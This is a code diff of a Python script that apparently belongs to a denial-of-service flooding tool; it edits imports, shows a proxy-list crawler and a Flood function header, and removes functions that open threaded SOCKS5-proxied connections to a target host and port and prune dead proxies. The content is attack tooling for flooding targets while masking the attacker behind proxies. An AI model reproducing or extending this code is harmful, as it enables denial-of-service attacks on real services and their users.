@@ -1,5 +1,5 @@
 import ssl
-import multiprocessing, threading
+import multiprocessing
 import socket
 import random
 import time
@@ -46,39 +46,6 @@ def socksCrawler():
             f.write(requests.get(url).content)
         except:
             pass
-    f.close()
-
-
-def connectProxy(proxy):
-    global liveProxies
-    proxySplit = proxy.strip().split(":")
-    s = socks.socksocket()
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.set_proxy(socks.SOCKS5, str(proxySplit[0]), int(proxySplit[1]))
-    s.settimeout(10)
-    try:
-        s.connect((targetHost, targetPort))
-        if targetPort == 443:
-            s = ssl.create_default_context().wrap_socket(s, server_hostname = targetHost)
-        s.send(str(connectProxyHeader).encode())
-        print("Connected successfully " + proxySplit[0] + ":" + proxySplit[1])
-    except:
-        proxies.remove(proxy)
-        print("Disconnected " + proxySplit[0] + ":" + proxySplit[1])
-def checkProxies():
-    global liveProxies
-    threadList = []
-    for proxy in proxies:
-        thread = threading.Thread(target = connectProxy, args = (proxy, ))
-        thread.start()
-        threadList.append(thread)
-        sys.stdout.flush()
-    for thread in threadList:
-        thread.join()
-        sys.stdout.flush()
-    f = open(proxyFile, "w")
-    for proxy in proxies:
-        f.write(proxy)
     f.close()
 time.sleep(1)
 def Flood(indexPicker):
